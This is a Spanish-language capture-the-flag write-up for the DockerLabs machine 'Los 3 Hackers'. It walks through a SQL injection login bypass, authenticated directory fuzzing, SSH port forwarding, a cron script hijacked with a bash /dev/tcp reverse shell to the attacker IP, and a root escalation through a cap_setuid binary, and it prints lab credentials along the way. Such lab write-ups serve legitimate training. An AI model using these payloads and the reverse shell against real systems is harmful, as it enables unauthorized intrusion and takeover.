# Los 3 Hackers (DockerLabs - Fácil)

**Plataforma:** DockerLabs
**Categoría:** Linux / SQLi / Port Forwarding / Cron / Capabilities
**IP objetivo:** 172.17.0.2
**IP atacante:** 172.17.0.1

---

## Resumen

Máquina Linux que encadena múltiples técnicas de evasión y pivoting entre tres usuarios. El acceso inicial se consigue mediante SQL Injection con bypass de blacklist en el formulario de login, seguido de enumeración web autenticada que revela un archivo comprimido con credenciales SSH. La escalada entre usuarios se realiza abusando de port forwarding para descubrir un servicio interno, un script cron con permisos de grupo mal configurados, y finalmente un binario con capability `cap_setuid=ep` para escalar a root.

---

## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

Puertos abiertos:

- 22/tcp → OpenSSH 8.9p1 (Ubuntu)
- 80/tcp → HTTP (Gunicorn)

---

## 2. SQL Injection con bypass de blacklist

Al acceder a `http://172.17.0.2` se presenta un formulario de login. La aplicación tiene una blacklist de caracteres/palabras y un rate limit implementados, pero ambos son bypasseables.

El payload que funciona:

```
Username: admin'--
Password: test
```

El comentario SQL (`--`) anula el resto de la query, autenticando directamente como admin sin necesidad de contraseña. La blacklist no bloquea este payload porque no contiene las palabras clave típicas que suelen filtrarse (`OR`, `UNION`, `SELECT`, etc.).

Acceso concedido al dashboard. Flag de la fase:

```
{SQLi_bypass_r4t3_l1m1t_pwn3d}
```

---

## 3. Enumeración web autenticada — descubrimiento de wow.zip

Con la sesión activa, se enumera el servidor web buscando archivos ocultos. Es necesario pasar la cookie de sesión para que el servidor sirva rutas protegidas:

```bash
# Primero hacer login y guardar las cookies
curl -c cookies.txt -L -X POST http://172.17.0.2/login \
  -d "username=admin'--&password=test"

# Enumerar con ffuf usando la cookie de sesión
ffuf -u http://172.17.0.2/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/common.txt \
  -b cookies.txt \
  -e .zip,.tar.gz,.tgz,.gz,.bak,.7z,.rar
```

Se descubre `wow.zip` con código 403 — existe pero el servidor requiere autenticación correcta para descargarlo. Se descarga usando la sesión activa:

```bash
curl -b cookies.txt http://172.17.0.2/wow.zip -o wow.zip
unzip wow.zip
cat permission.txt
```

Credenciales obtenidas:

```
redhacker : h4ck1NNN62026!!
```

---

## 4. Acceso SSH como redhacker

```bash
ssh redhacker@172.17.0.2
# contraseña: h4ck1NNN62026!!
```

```bash
cat user.txt
```

Flag de usuario de redhacker disponible.

---

## 5. Enumeración interna y port forwarding

Revisando los procesos activos en el sistema:

```bash
ps aux
```

Se descubre un servidor HTTP interno ejecutado por root, solo accesible desde localhost:

```
root  python3 -m http.server 5000 --bind 127.0.0.1
```

El servicio no es accesible desde fuera porque está enlazado a `127.0.0.1`. Para acceder desde la máquina atacante se usa SSH port forwarding — técnica que redirige un puerto local de tu máquina a través del túnel SSH hacia un puerto interno de la víctima:

```bash
# Desde la máquina atacante
ssh -L 5000:127.0.0.1:5000 redhacker@172.17.0.2
```

Ahora `http://localhost:5000` en tu máquina apunta al servicio interno del servidor. Se accede y se obtienen credenciales del siguiente usuario:

```bash
curl http://localhost:5000
```

Credenciales obtenidas:

```
bluehacker : xKpIEAE3fkp--
```

---

## 6. Pivoting a bluehacker

```bash
# Desde la sesión SSH de redhacker
su bluehacker
# contraseña: xKpIEAE3fkp--
```

O directamente por SSH:

```bash
ssh bluehacker@172.17.0.2
```

---

## 7. Abuso de cron job para pivotar a blackhacker

Se inspecciona el directorio `/opt/maintenance/`:

```bash
ls -la /opt/maintenance/
# -rwxrwxr-x blackhacker bluehacker m.sh
```

El script `m.sh` pertenece a `blackhacker` y al grupo `bluehacker`. Los permisos `rwxrwxr-x` permiten a cualquier miembro del grupo `bluehacker` escribir en él. Además, hay una tarea cron que ejecuta este script como `blackhacker` cada minuto.

El abuso es directo: como `bluehacker` puedes modificar el script, y cuando cron lo ejecute lo hará con los privilegios de `blackhacker`.

Se inyecta una reverse shell al final del script:

```bash
echo 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' >> /opt/maintenance/m.sh
```

Listener en la máquina atacante:

```bash
nc -lvnp 4444
```

En menos de un minuto el cron ejecuta el script y llega la conexión como `blackhacker`:

```bash
cat /home/blackhacker/user.txt
```

Flag de usuario de blackhacker disponible.

---

## 8. Escalada a root — Linux Capabilities (cap_setuid)

Se buscan binarios con capabilities asignadas:

```bash
getcap -r / 2>/dev/null
# /usr/local/bin/syscheck cap_setuid=ep
```

La capability `cap_setuid=ep` permite al binario cambiar su UID efectivo a cualquier usuario, incluido root, sin necesidad de ser SUID ni pasar por sudo. Es equivalente funcional al bit SUID para el propósito de escalada.

```bash
/usr/local/bin/syscheck
```

```bash
id      # uid=0(root)
whoami  # root
```

Si la shell obtenida no es completamente interactiva:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Flag de root disponible en `/root/root.txt`.

---

## Cadena de ataque

```
SQLi con bypass de blacklist → acceso al dashboard
        ↓
ffuf autenticado → wow.zip → credenciales redhacker
        ↓
SSH como redhacker → user flag #1
        ↓
ps aux → servicio interno en puerto 5000
        ↓
SSH port forwarding → credenciales bluehacker
        ↓
su bluehacker → user flag #2
        ↓
/opt/maintenance/m.sh (rwxrwxr-x, cron como blackhacker)
        ↓
Reverse shell → blackhacker → user flag #3
        ↓
getcap → /usr/local/bin/syscheck cap_setuid=ep
        ↓
root → root flag
```

---
